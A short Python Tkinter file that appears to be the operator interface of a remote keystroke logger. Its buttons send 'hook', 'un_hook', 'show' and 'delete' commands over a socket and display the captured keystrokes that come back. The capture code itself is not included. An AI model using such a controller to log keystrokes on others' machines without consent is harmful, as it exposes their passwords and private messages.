import tkinter as tk
import mysocket as msk
class keystroke_ui(tk.Frame):
    def __init__(self,master=None,sk=None):
        super().__init__(master)
        self.master=master
        self.master.title("Keystroke")
        self.master.grid_rowconfigure(0,weight=1)
        self.master.grid_columnconfigure(0,weight=1)
        self.master.resizable(False,False)
        self.sk=sk
        self.grid()
        self.create_widgets()
    def create_widgets(self):
        self.hook=tk.Button(self,text='Hook',width=10,height=5)
        self.un_hook=tk.Button(self,text='Un hook',width=10,height=5)
        self.show=tk.Button(self,text='Show',width=10,height=5)
        self.delete=tk.Button(self,text='Delete',width=10,height=5)
        self.hook['command']=self.hook_func
        self.hook.grid(row=0,column=0,padx=10,pady=10)
        self.un_hook['command']=self.un_hook_func
        self.un_hook.grid(row=0,column=1,padx=10,pady=10)
        self.show['command']=self.show_func
        self.show.grid(row=0,column=2,padx=10,pady=10)
        self.delete['command']=self.delete_func
        self.delete.grid(row=0,column=3,padx=10,pady=10)
        self.showscreen=tk.Text(self,width=100,height=50)
        self.showscreen.grid(row=1,column=0,padx=10,pady=10,sticky=tk.S,columnspan=4)
        self.master.protocol("WM_DELETE_WINDOW", self.on_exit)
    def hook_func(self):
        self.sk.client.sendall(bytes('hook','utf8'))
    def un_hook_func(self):
        self.sk.client.sendall(bytes('un_hook','utf8'))
    def show_func(self):
        self.sk.client.sendall(bytes('show','utf8'))
        size=int(self.sk.client.recv(4096).decode('utf8'))
        strings=b""
        while size>0:
            data=self.sk.client.recv(4096)
            strings+=data
            size-=len(data)
        self.showscreen.delete("1.0","end")
        self.showscreen.insert(tk.END,str(strings.decode('utf8')))
    def delete_func(self):
        self.sk.client.sendall(bytes('delete','utf8'))
        self.showscreen.delete("1.0","end")
    def on_exit(self):
        self.sk.client.sendall(bytes("exit","utf8"))
        self.master.destroy()

